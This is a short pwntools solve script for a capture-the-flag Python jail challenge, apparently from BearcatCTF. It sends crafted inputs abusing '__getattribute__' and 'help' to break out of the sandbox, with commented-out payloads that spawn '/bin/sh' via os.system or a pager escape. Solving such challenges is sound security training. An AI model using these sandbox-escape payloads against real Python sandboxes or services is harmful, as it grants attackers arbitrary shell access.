from pwn import *

context.clear(arch='amd64')

p = process('./jail.py')
#p = remote('chal.bearcatctf.io', 35707)

print(p.recvuntil(b'\n').decode())

type = b'(0<0)'    # tuple, int, or bool
fn_args = b'''["__class__"]'''
type_attribute = b'__getattribute__'
builtin_fn = b'help'

p.sendline(type)
p.sendline(fn_args)
p.sendline(type_attribute)
p.sendline(builtin_fn)

# p.sendline('builtins.__import__("os").system("/bin/sh")')
# p.sendline(b'!/bin/sh')

p.interactive()
